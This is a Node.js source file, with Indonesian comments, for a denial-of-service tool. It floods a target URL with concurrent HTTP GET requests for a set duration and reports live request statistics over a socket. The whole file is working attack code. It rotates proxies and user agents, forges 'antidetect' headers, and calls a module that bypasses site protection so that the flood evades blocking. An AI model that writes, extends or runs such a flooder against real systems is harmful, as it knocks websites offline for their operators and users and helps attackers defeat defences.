const { fetch } = require('undici');
const bypass = require('./bypass');
const proxyRotation = require('./proxyrotation');
const uaRotation = require('./uarotation');
const antidetect = require('./antidetect');
const { CookieJar } = require('tough-cookie');
const { performance } = require('perf_hooks');

let isAttacking = false;
let activeThreads = 0;
let totalRequests = 0;
let successCount = 0;
let errorCount = 0;
let attackInterval;
let attackTimeout;
let lastRpsUpdate = 0;
let requestsPerSecond = 0;
const cookieJar = new CookieJar();

const sendRequest = async (targetUrl, options, io) => {
  if (!isAttacking) return;
  
  try {
    const proxyUrl = options.proxy ? await proxyRotation.getRandomProxy() : null;
    const ua = uaRotation.getRandomUA();
    const headers = options.antidetect ? antidetect.generateAntiDetectHeaders(ua) : { 'User-Agent': ua };
    
    const requestOptions = {
      method: 'GET',
      headers: headers,
      timeout: 6000,
      dispatcher: proxyUrl ? new bypass.ProxyAgent(proxyUrl) : undefined
    };
    
    // Gunakan bypass jika diaktifkan
    const response = options.bypass ?
      await bypass.bypassProtection(targetUrl, requestOptions, cookieJar) :
      await fetch(targetUrl, requestOptions);
    
    const status = response.status || response.statusCode;
    
    if (status >= 200 && status < 400) {
      successCount++;
    } else {
      errorCount++;
      io.emit('error', `HTTP Error: ${status}`);
    }
  } catch (error) {
    errorCount++;
    io.emit('error', error.message);
  } finally {
    totalRequests++;
    activeThreads--;
    requestsPerSecond++;
  }
};

const startAttack = (targetUrl, threads, duration, options, io) => {
  isAttacking = true;
  totalRequests = 0;
  successCount = 0;
  errorCount = 0;
  activeThreads = 0;
  requestsPerSecond = 0;
  lastRpsUpdate = performance.now();
  
  // Inisialisasi proxy jika diaktifkan
  if (options.proxy) {
    proxyRotation.initProxies();
  }
  
  // Update RPS setiap detik
  const rpsInterval = setInterval(() => {
    if (!isAttacking) {
      clearInterval(rpsInterval);
      return;
    }
    
    io.emit('stats_update', {
      totalRequests,
      successCount,
      errorCount,
      activeThreads,
      rps: requestsPerSecond,
      activeProxies: proxyRotation.activeProxyCount(),
      totalProxies: proxyRotation.totalProxyCount()
    });
    
    requestsPerSecond = 0;
    lastRpsUpdate = performance.now();
  }, 1000);
  
  attackInterval = setInterval(() => {
    if (!isAttacking) {
      clearInterval(attackInterval);
      return;
    }
    
    const threadsToLaunch = Math.min(threads * 2, threads * 5 - activeThreads);
    for (let i = 0; i < threadsToLaunch; i++) {
      activeThreads++;
      sendRequest(targetUrl, options, io);
    }
  }, 100);
  
  attackTimeout = setTimeout(() => {
    stopAttack(io);
  }, duration * 1000);
};

const stopAttack = (io) => {
  isAttacking = false;
  if (attackInterval) clearInterval(attackInterval);
  if (attackTimeout) clearTimeout(attackTimeout);
  io.emit('attack_stopped');
};

module.exports = { startAttack, stopAttack };